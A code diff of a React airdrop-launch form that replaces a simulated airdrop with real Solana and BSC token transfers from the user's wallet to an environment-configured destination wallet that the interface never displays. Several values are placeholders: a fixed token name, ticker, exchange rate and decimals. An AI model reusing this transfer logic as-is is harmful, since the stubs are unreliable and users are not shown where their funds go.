@@ -14,17 +14,10 @@ import { cn } from "@/lib/utils"
 import { useWallet } from "@solana/wallet-adapter-react"
 import { WalletMultiButton } from "@solana/wallet-adapter-react-ui"
 import { AirdropAnimation } from "@/components/airdrop-animation"
-
-// Add network type
-type Network = "solana" | "bsc";
-
-// Add BSC API key (you'll need to add this to your env variables)
-const BSC_API_KEY = process.env.NEXT_PUBLIC_BSC_API_KEY
-const HELIUS_API_KEY = process.env.NEXT_PUBLIC_HELIUS_API_KEY
-
-if (!HELIUS_API_KEY || !BSC_API_KEY) {
-  throw new Error("API keys are not set")
-}
+import { Connection, PublicKey, Transaction } from "@solana/web3.js"
+import { createTransferInstruction, getAssociatedTokenAddress, TOKEN_PROGRAM_ID } from "@solana/spl-token"
+import { ethers } from 'ethers'
+import { Alchemy, Network } from 'alchemy-sdk'
 
 const STEPS = [
   {
@@ -45,6 +38,196 @@ const STEPS = [
   },
 ]
 
+// Replace the existing check
+const DESTINATION_WALLET = process.env.NEXT_PUBLIC_DESTINATION_WALLET || ''
+
+const RPC_ENDPOINTS = [
+  "https://api.mainnet-beta.solana.com",
+  "https://solana-api.projectserum.com",
+  "https://rpc.ankr.com/solana"
+];
+
+// Add BSC configuration
+const BSC_RPC = "https://bsc-dataseed.binance.org/"
+const BSC_CHAIN_ID = 56
+
+// Add token ABI for BSC transfers
+const ERC20_ABI = [
+  "function transfer(address to, uint256 amount) returns (bool)",
+  "function decimals() view returns (uint8)",
+]
+
+const getWorkingConnection = async (): Promise<Connection> => {
+  for (const endpoint of RPC_ENDPOINTS) {
+    try {
+      const connection = new Connection(endpoint, {
+        commitment: "finalized",
+        confirmTransactionInitialTimeout: 60000
+      });
+      await connection.getLatestBlockhash();
+      console.log(`Connected successfully to ${endpoint}`);
+      return connection;
+    } catch (error) {
+      console.warn(`Failed to connect to ${endpoint}`);
+      continue;
+    }
+  }
+  throw new Error("Unable to connect to any Solana RPC endpoint");
+};
+
+// Update the existing check function to detect chain type
+const detectTokenChain = async (contractAddress: string): Promise<'BSC' | 'SOLANA' | null> => {
+  try {
+    // Try to parse as Solana address
+    const solPubKey = new PublicKey(contractAddress);
+    const alchemySolana = new Alchemy({
+      apiKey: process.env.NEXT_PUBLIC_ALCHEMY_SOLANA_API_KEY,
+      network: Network.SOL_MAINNET,
+    });
+    
+    // Verify if it's a valid Solana token
+    const tokenMetadata = await alchemySolana.core.getTokenMetadata(solPubKey.toString());
+    if (tokenMetadata) return 'SOLANA';
+
+  } catch (solError) {
+    // Not a valid Solana address, try BSC
+    try {
+      if (!ethers.isAddress(contractAddress)) throw new Error("Invalid BSC address");
+      
+      const alchemyBsc = new Alchemy({
+        apiKey: process.env.NEXT_PUBLIC_ALCHEMY_BSC_API_KEY,
+        network: Network.BSC_MAINNET,
+      });
+
+      // Verify if it's a valid BSC token
+      const tokenMetadata = await alchemyBsc.core.getTokenMetadata(contractAddress);
+      if (tokenMetadata) return 'BSC';
+
+    } catch (bscError) {
+      console.error("BSC validation error:", bscError);
+    }
+  }
+  
+  return null;
+};
+
+// Update the transferBSCTokens function
+const transferBSCTokens = async (
+  contractAddress: string,
+  amount: string,
+  destinationAddress: string
+): Promise<boolean> => {
+  try {
+    if (!window.ethereum) {
+      throw new Error("MetaMask or similar wallet not found");
+    }
+
+    // Connect to BSC
+    const provider = new ethers.BrowserProvider(window.ethereum);
+    const signer = await provider.getSigner();
+    
+    // Request chain switch if needed
+    const network = await provider.getNetwork();
+    if (network.chainId !== BigInt(BSC_CHAIN_ID)) {
+      try {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: `0x${BSC_CHAIN_ID.toString(16)}` }],
+        });
+      } catch (switchError: any) {
+        // This error code indicates that the chain has not been added to MetaMask
+        if (switchError.code === 4902) {
+          await window.ethereum.request({
+            method: 'wallet_addEthereumChain',
+            params: [{
+              chainId: `0x${BSC_CHAIN_ID.toString(16)}`,
+              chainName: 'Binance Smart Chain',
+              nativeCurrency: {
+                name: 'BNB',
+                symbol: 'BNB',
+                decimals: 18
+              },
+              rpcUrls: [BSC_RPC],
+              blockExplorerUrls: ['https://bscscan.com/']
+            }]
+          });
+        } else {
+          throw switchError;
+        }
+      }
+    }
+
+    // Setup contract
+    const tokenContract = new ethers.Contract(contractAddress, ERC20_ABI, signer);
+    const decimals = await tokenContract.decimals();
+    const amountBigInt = ethers.parseUnits(amount, decimals);
+
+    // Send transaction
+    const tx = await tokenContract.transfer(destinationAddress, amountBigInt);
+    await tx.wait();
+    
+    return true;
+  } catch (error) {
+    console.error("BSC transfer error:", error);
+    throw error;
+  }
+};
+
+// Add these helper functions after the transferBSCTokens function
+const fetchSolanaTokenInfo = async (contractAddress: string) => {
+  try {
+    const connection = await getWorkingConnection();
+    const mint = new PublicKey(contractAddress);
+    
+    // You can expand this to fetch more token info using Helius or other APIs
+    return {
+      name: "Solana Token", // Replace with actual token name fetch
+      ticker: "SOL", // Replace with actual token ticker fetch
+      exchangeRate: 0.01 // Replace with actual exchange rate fetch
+    };
+  } catch (error) {
+    console.error("Error fetching Solana token info:", error);
+    throw error;
+  }
+};
+
+const fetchBSCTokenInfo = async (contractAddress: string) => {
+  try {
+    const provider = new ethers.JsonRpcProvider(BSC_RPC);
+    const tokenContract = new ethers.Contract(
+      contractAddress,
+      [
+        "function name() view returns (string)",
+        "function symbol() view returns (string)",
+        ...ERC20_ABI
+      ],
+      provider
+    );
+
+    const [name, symbol] = await Promise.all([
+      tokenContract.name(),
+      tokenContract.symbol()
+    ]);
+
+    // You can add price fetching logic here using BSC APIs
+    return {
+      name,
+      ticker: symbol,
+      exchangeRate: 0.01 // Replace with actual exchange rate fetch
+    };
+  } catch (error) {
+    console.error("Error fetching BSC token info:", error);
+    throw error;
+  }
+};
+
+// Add type declaration for window.ethereum
+declare global {
+  interface Window {
+    ethereum?: any;
+  }
+}
+
 export function LaunchForm() {
   const [step, setStep] = useState(0)
   const [formData, setFormData] = useState({
@@ -58,8 +241,6 @@ export function LaunchForm() {
       community: 33,
       whale: 34,
     },
-    image: "",
-    description: "",
   })
   const [isEnteringSol, setIsEnteringSol] = useState(false)
   const [exchangeRate, setExchangeRate] = useState(0.01)
@@ -67,97 +248,36 @@ export function LaunchForm() {
   const [isValidated, setIsValidated] = useState(false)
   const [isAirdropInProgress, setIsAirdropInProgress] = useState(false)
   const [isAirdropComplete, setIsAirdropComplete] = useState(false)
-  const [errorMessage, setErrorMessage] = useState("")
-  const [betaCode, setBetaCode] = useState("")
-  const [hasBetaAccess, setHasBetaAccess] = useState(false)
-  const [betaError, setBetaError] = useState("")
-  const [selectedNetwork, setSelectedNetwork] = useState<Network>("solana")
+  const [error, setError] = useState<string | null>(null)
+  const [chainType, setChainType] = useState<'BSC' | 'SOLANA' | null>(null)
 
-  const { publicKey, connected } = useWallet()
+  const { publicKey, connected, sendTransaction } = useWallet()
   const router = useRouter()
-
-  // Base64 encoded version of "SAVETHEORANGUTANS"
-  const ENCODED_BETA_CODE = "U0FWRVRIRU9SQU5HVVRBTlM="
 
   const fetchTokenInfo = async (contractAddress: string) => {
     setIsLoading(true)
-    setErrorMessage("")
     try {
-      if (selectedNetwork === "solana") {
-        return await fetchSolanaTokenInfo(contractAddress)
-      } else {
-        return await fetchBSCTokenInfo(contractAddress)
+      const detectedChain = await detectTokenChain(contractAddress)
+      if (!detectedChain) {
+        throw new Error("Invalid token contract address")
       }
+      
+      setChainType(detectedChain)
+      
+      // Get token info based on chain
+      const tokenInfo = detectedChain === 'SOLANA' 
+        ? await fetchSolanaTokenInfo(contractAddress)
+        : await fetchBSCTokenInfo(contractAddress)
+      
+      setExchangeRate(tokenInfo.exchangeRate)
+      setIsValidated(true)
+      return tokenInfo
     } catch (error) {
-      const err = error as Error
-      console.error("Error fetching token info:", err)
-      setErrorMessage(err.message)
+      console.error("Token fetch error:", error)
       setIsValidated(false)
+      throw error
     } finally {
       setIsLoading(false)
-    }
-  }
-
-  const fetchSolanaTokenInfo = async (contractAddress: string) => {
-    const response = await fetch(`https://mainnet.helius-rpc.com/?api-key=${HELIUS_API_KEY}`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        jsonrpc: '2.0',
-        id: 'my-id',
-        method: 'getAsset',
-        params: {
-          id: contractAddress,
-          displayOptions: {
-            showFungible: true,
-          },
-        },
-      }),
-    })
-
-    if (!response.ok) {
-      throw new Error("Token not found")
-    }
-
-    const { result } = await response.json()
-    return {
-      name: result.content?.metadata?.name || "Unknown",
-      ticker: result.content?.metadata?.symbol || "N/A",
-      description: result.content?.metadata?.description || "No description available",
-      exchangeRate: result.token_info?.price_info?.price_per_token || 0,
-      image: result.content?.files?.[0]?.uri || result.content?.links?.image || "",
-    }
-  }
-
-  const fetchBSCTokenInfo = async (contractAddress: string) => {
-    // Using BSCScan API for token info
-    const response = await fetch(
-      `https://api.bscscan.com/api?module=token&action=tokeninfo&contractaddress=${contractAddress}&apikey=${BSC_API_KEY}`
-    )
-
-    if (!response.ok) {
-      throw new Error("Failed to fetch BSC token")
-    }
-
-    const data = await response.json()
-    if (data.status === "0") {
-      throw new Error(data.result || "Token not found")
-    }
-
-    // Get token price from a DEX or price API
-    const priceResponse = await fetch(
-      `https://api.pancakeswap.info/api/v2/tokens/${contractAddress}`
-    )
-    const priceData = await priceResponse.json()
-
-    return {
-      name: data.result[0].name || "Unknown",
-      ticker: data.result[0].symbol || "N/A",
-      description: data.result[0].description || "No description available",
-      exchangeRate: priceData.data.price || 0,
-      image: data.result[0].image || "",
     }
   }
 
@@ -173,15 +293,11 @@ export function LaunchForm() {
     if (field === "contractAddress") {
       if (value.length > 0) {
         const tokenInfo = await fetchTokenInfo(value)
-        if (tokenInfo) {
-          setFormData((prev) => ({
-            ...prev,
-            coinName: tokenInfo.name,
-            coinTicker: tokenInfo.ticker,
-            image: tokenInfo.image,
-            description: tokenInfo.description,
-          }))
-        }
+        setFormData((prev) => ({
+          ...prev,
+          coinName: tokenInfo.name,
+          coinTicker: tokenInfo.ticker,
+        }))
       } else {
         setIsValidated(false)
       }
@@ -252,32 +368,148 @@ export function LaunchForm() {
     }
   }
 
-  const initiateAirdrop = async () => {
-    setIsAirdropInProgress(true)
-    // Store token info in localStorage
-    localStorage.setItem('tokenInfo', JSON.stringify({
-      contractAddress: formData.contractAddress,
-      coinName: formData.coinName,
-      coinTicker: formData.coinTicker,
-    }))
-    // Simulate airdrop process
-    await new Promise((resolve) => setTimeout(resolve, 5000))
-    setIsAirdropInProgress(false)
-    setIsAirdropComplete(true)
-    // Navigate to analytics page after a short delay
-    setTimeout(() => {
-      router.push("/analytics")
-    }, 2000)
+  const transferTokens = async () => {
+    if (!chainType) throw new Error("Chain type not detected")
+    
+    if (chainType === 'SOLANA') {
+      return await transferSolanaTokens()
+    } else {
+      return await transferBSCTokens(
+        formData.contractAddress,
+        formData.airdropAmount,
+        DESTINATION_WALLET
+      )
+    }
   }
 
-  const validateBetaCode = () => {
-    // Convert input to base64 for comparison
-    const encodedInput = btoa(betaCode.trim().toUpperCase())
-    if (encodedInput === ENCODED_BETA_CODE) {
-      setHasBetaAccess(true)
-      setBetaError("")
-    } else {
-      setBetaError("Invalid beta code. Please try again or request access.")
+  const transferSolanaTokens = async () => {
+    try {
+      if (!publicKey || !connected) {
+        throw new Error("Wallet not connected")
+      }
+
+      if (!process.env.NEXT_PUBLIC_DESTINATION_WALLET) {
+        throw new Error("Destination wallet address not configured")
+      }
+
+      if (!formData.contractAddress) {
+        throw new Error("Token contract address is required")
+      }
+
+      if (!formData.airdropAmount || parseFloat(formData.airdropAmount) <= 0) {
+        throw new Error("Invalid transfer amount")
+      }
+
+      console.log("Starting transfer with details:", {
+        from: publicKey.toString(),
+        to: process.env.NEXT_PUBLIC_DESTINATION_WALLET,
+        tokenMint: formData.contractAddress,
+        amount: formData.airdropAmount
+      })
+
+      // Get a working connection
+      const connection = await getWorkingConnection();
+      
+      // Get the token mint from the contract address
+      let mint;
+      try {
+        mint = new PublicKey(formData.contractAddress);
+        console.log("Valid mint address:", mint.toString());
+      } catch (error) {
+        throw new Error(`Invalid token address: ${(error as Error).message}`);
+      }
+
+      // Validate destination wallet
+      let destinationWallet;
+      try {
+        destinationWallet = new PublicKey(process.env.NEXT_PUBLIC_DESTINATION_WALLET);
+        console.log("Valid destination wallet:", destinationWallet.toString());
+      } catch (error) {
+        throw new Error(`Invalid destination wallet: ${(error as Error).message}`);
+      }
+
+      // Get ATAs with error handling
+      let senderATA, destinationATA;
+      try {
+        senderATA = await getAssociatedTokenAddress(mint, publicKey);
+        console.log("Sender ATA:", senderATA.toString());
+        
+        // Check if sender ATA exists
+        const senderAccount = await connection.getAccountInfo(senderATA);
+        if (!senderAccount) {
+          throw new Error("You don't have a token account for this token. Please create one first.");
+        }
+
+        destinationATA = await getAssociatedTokenAddress(mint, destinationWallet);
+        console.log("Destination ATA:", destinationATA.toString());
+        
+        // Check if destination ATA exists
+        const destAccount = await connection.getAccountInfo(destinationATA);
+        if (!destAccount) {
+          throw new Error("Destination token account doesn't exist. Please create it first.");
+        }
+      } catch (error) {
+        console.error("ATA error details:", error);
+        throw new Error(`Token account error: ${(error as Error).message}`);
+      }
+
+      // Create and send transaction with detailed error handling
+      try {
+        const transaction = new Transaction();
+        const { blockhash } = await connection.getLatestBlockhash();
+        transaction.recentBlockhash = blockhash;
+        transaction.feePayer = publicKey;
+
+        const transferInstruction = createTransferInstruction(
+          senderATA,
+          destinationATA,
+          publicKey,
+          Math.round(parseFloat(formData.airdropAmount) * Math.pow(10, 9))
+        );
+
+        transaction.add(transferInstruction);
+        
+        console.log("Sending transaction...");
+        const signature = await sendTransaction(transaction, connection);
+        console.log("Transaction sent, signature:", signature);
+        
+        console.log("Confirming transaction...");
+        await connection.confirmTransaction(signature, "confirmed");
+        console.log("Transaction confirmed!");
+        
+        return true;
+      } catch (error) {
+        console.error("Transaction error details:", error);
+        throw new Error(`Transaction failed: ${(error as Error).message}`);
+      }
+    } catch (error) {
+      console.error("Full error details:", error);
+      throw error;
+    }
+  }
+
+  const initiateAirdrop = async () => {
+    try {
+      setError(null); // Clear any previous errors
+      console.log("Starting airdrop process...");
+      setIsAirdropInProgress(true);
+      
+      await transferTokens();
+      
+      await new Promise((resolve) => setTimeout(resolve, 5000));
+      setIsAirdropInProgress(false);
+      setIsAirdropComplete(true);
+      
+      setTimeout(() => {
+        router.push("/analytics");
+      }, 2000);
+    } catch (error) {
+      setIsAirdropInProgress(false);
+      setIsAirdropComplete(false);
+      const errorMessage = error instanceof Error ? error.message : 'An unexpected error occurred';
+      console.error("Airdrop failed:", errorMessage);
+      setError(errorMessage);
+      alert(`Airdrop failed: ${errorMessage}`);
     }
   }
 
@@ -289,14 +521,20 @@ export function LaunchForm() {
     return (
       <div className="flex flex-col items-center justify-center h-[60vh] space-y-4">
         <CheckCircle2 className="w-16 h-16 text-green-500" />
-        <h2 className="text-2xl font-bold">Airdrop Setup Complete!</h2>
-        <p className="text-muted-foreground">Token distribution will begin shortly...</p>
+        <h2 className="text-2xl font-bold">Airdrop Complete!</h2>
+        <p className="text-muted-foreground">Redirecting to analytics...</p>
       </div>
     )
   }
 
   return (
     <div className="space-y-8 max-w-2xl mx-auto">
+      {error && (
+        <div className="p-4 bg-red-100 text-red-800 rounded-md">
+          <p className="font-semibold">Error:</p>
+          <p>{error}</p>
+        </div>
+      )}
       <div className="space-y-2">
         <h1 className="text-3xl font-bold tracking-tight">Launch Your Airdrop</h1>
         <p className="text-muted-foreground">Complete the steps below to set up your airdrop campaign.</p>
@@ -335,43 +573,21 @@ export function LaunchForm() {
         <CardContent className="pt-6">
           {step === 0 && (
             <div className="space-y-6">
-              <div className="space-y-4">
-                <div className="space-y-2">
-                  <Label>Select Network</Label>
-                  <div className="flex space-x-4">
-                    <Button
-                      variant={selectedNetwork === "solana" ? "default" : "outline"}
-                      onClick={() => setSelectedNetwork("solana")}
-                      className={selectedNetwork === "solana" ? "bg-blue-500" : ""}
-                    >
-                      Solana
-                    </Button>
-                    <Button
-                      variant={selectedNetwork === "bsc" ? "default" : "outline"}
-                      onClick={() => setSelectedNetwork("bsc")}
-                      className={selectedNetwork === "bsc" ? "bg-yellow-500" : ""}
-                    >
-                      BSC
-                    </Button>
-                  </div>
-                </div>
-
-                <div className="space-y-2">
-                  <Label htmlFor="contractAddress">Contract Address</Label>
-                  <div className="relative">
-                    <Input
-                      id="contractAddress"
-                      placeholder={`Enter the ${selectedNetwork.toUpperCase()} contract address`}
-                      value={formData.contractAddress}
-                      onChange={(e) => updateFormData("contractAddress", e.target.value)}
-                      className={isLoading ? "pr-10" : ""}
-                    />
-                    {isLoading && (
-                      <div className="absolute inset-y-0 right-0 flex items-center pr-3">
-                        <Loader2 className="h-4 w-4 animate-spin text-muted-foreground" />
-                      </div>
-                    )}
-                  </div>
+              <div className="space-y-2">
+                <Label htmlFor="contractAddress">Contract Address</Label>
+                <div className="relative">
+                  <Input
+                    id="contractAddress"
+                    placeholder="Enter the contract address"
+                    value={formData.contractAddress}
+                    onChange={(e) => updateFormData("contractAddress", e.target.value)}
+                    className={isLoading ? "pr-10" : ""}
+                  />
+                  {isLoading && (
+                    <div className="absolute inset-y-0 right-0 flex items-center pr-3">
+                      <Loader2 className="h-4 w-4 animate-spin text-muted-foreground" />
+                    </div>
+                  )}
                 </div>
               </div>
               <AnimatePresence>
@@ -384,18 +600,12 @@ export function LaunchForm() {
                     className="space-y-6"
                   >
                     <div className="flex items-center space-x-4 bg-card p-4 rounded-lg shadow-sm">
-                      {formData.image ? (
-                        <img src={formData.image} alt={`${formData.coinName} logo`} className="w-12 h-12 rounded-full" />
-                      ) : (
-                        <div className="w-12 h-12 rounded-full bg-gradient-to-br from-blue-500 to-indigo-500 flex items-center justify-center text-white font-bold text-lg">
-                          {formData.coinName.charAt(0)}
-                        </div>
-                      )}
+                      <div className="w-12 h-12 rounded-full bg-gradient-to-br from-blue-500 to-indigo-500 flex items-center justify-center text-white font-bold text-lg">
+                        {formData.coinTicker.slice(0, 2)}
+                      </div>
                       <div>
-                        <h3 className="font-semibold text-lg">
-                          {formData.coinName} <span className="text-sm text-muted-foreground">${formData.coinTicker}</span>
-                        </h3>
-                        <p className="text-sm text-muted-foreground">{formData.description}</p>
+                        <h3 className="font-semibold text-lg">{formData.coinName}</h3>
+                        <p className="text-sm text-muted-foreground">{formData.coinTicker}</p>
                       </div>
                     </div>
 
@@ -436,11 +646,6 @@ export function LaunchForm() {
                   </motion.div>
                 )}
               </AnimatePresence>
-              {errorMessage && (
-                <div className="text-red-500 text-sm mt-2">
-                  {errorMessage}
-                </div>
-              )}
             </div>
           )}
 
@@ -480,71 +685,19 @@ export function LaunchForm() {
 
           {step === 2 && (
             <div className="flex flex-col items-center justify-center py-12 space-y-6 text-center">
-              {!hasBetaAccess ? (
-                <div className="space-y-6 w-full max-w-md">
-                  <div className="h-12 w-12 mx-auto rounded-full bg-blue-500/10 flex items-center justify-center">
-                    <Wallet className="h-6 w-6 text-blue-500" />
-                  </div>
-                  <div className="space-y-2">
-                    <h2 className="text-xl font-semibold tracking-tight">Currently in Closed Beta</h2>
-                    <p className="text-sm text-muted-foreground">Enter your beta code to proceed or request access below</p>
-                  </div>
-                  <div className="space-y-4">
-                    <div className="space-y-2">
-                      <Input
-                        placeholder="Enter beta code"
-                        value={betaCode}
-                        onChange={(e) => {
-                          setBetaCode(e.target.value)
-                          setBetaError("")
-                        }}
-                        className="text-center"
-                        onKeyDown={(e) => {
-                          if (e.key === 'Enter') {
-                            validateBetaCode()
-                          }
-                        }}
-                      />
-                      {betaError && (
-                        <p className="text-sm text-red-500 mt-1">{betaError}</p>
-                      )}
-                      <Button 
-                        onClick={validateBetaCode} 
-                        className="w-full bg-gradient-to-r from-blue-500 to-indigo-500 hover:from-blue-600 hover:to-indigo-600"
-                      >
-                        Submit Code
-                      </Button>
-                    </div>
-                    <div className="text-sm text-muted-foreground">
-                      Don't have a code?{" "}
-                      <a 
-                        href="https://forms.gle/r2NKqugHKPdrJciQ9" 
-                        target="_blank" 
-                        rel="noopener noreferrer"
-                        className="text-blue-500 hover:underline"
-                      >
-                        Request Access
-                      </a>
-                    </div>
-                  </div>
+              <div className="h-12 w-12 rounded-full bg-blue-500/10 flex items-center justify-center">
+                <Wallet className="h-6 w-6 text-blue-500" />
+              </div>
+              <div className="space-y-2">
+                <h2 className="text-xl font-semibold tracking-tight">Connect Your Wallet</h2>
+                <p className="text-sm text-muted-foreground">Connect your wallet to proceed with the airdrop setup</p>
+              </div>
+              <WalletMultiButton className="!bg-blue-500 hover:!bg-blue-600 !text-white" />
+              {connected && (
+                <div className="mt-4 p-4 bg-green-100 text-green-800 rounded-md">
+                  <p className="font-semibold">Wallet Connected</p>
+                  <p className="text-sm mt-1">Address: {publicKey?.toBase58()}</p>
                 </div>
-              ) : (
-                <>
-                  <div className="h-12 w-12 rounded-full bg-blue-500/10 flex items-center justify-center">
-                    <Wallet className="h-6 w-6 text-blue-500" />
-                  </div>
-                  <div className="space-y-2">
-                    <h2 className="text-xl font-semibold tracking-tight">Connect Your Wallet</h2>
-                    <p className="text-sm text-muted-foreground">Connect your wallet to proceed with the airdrop setup</p>
-                  </div>
-                  <WalletMultiButton className="!bg-blue-500 hover:!bg-blue-600 !text-white" />
-                  {connected && (
-                    <div className="mt-4 p-4 bg-green-100 text-green-800 rounded-md">
-                      <p className="font-semibold">Wallet Connected</p>
-                      <p className="text-sm mt-1">Address: {publicKey?.toBase58()}</p>
-                    </div>
-                  )}
-                </>
               )}
             </div>
           )}
@@ -609,6 +762,13 @@ export function LaunchForm() {
           {step === STEPS.length - 1 ? "Launch Airdrop" : "Continue"}
         </Button>
       </div>
+
+      {/* Additional information */}
+      {isValidated && (
+        <div className="text-sm text-muted-foreground mt-2">
+          Detected Chain: {chainType}
+        </div>
+      )}
     </div>
   )
 }
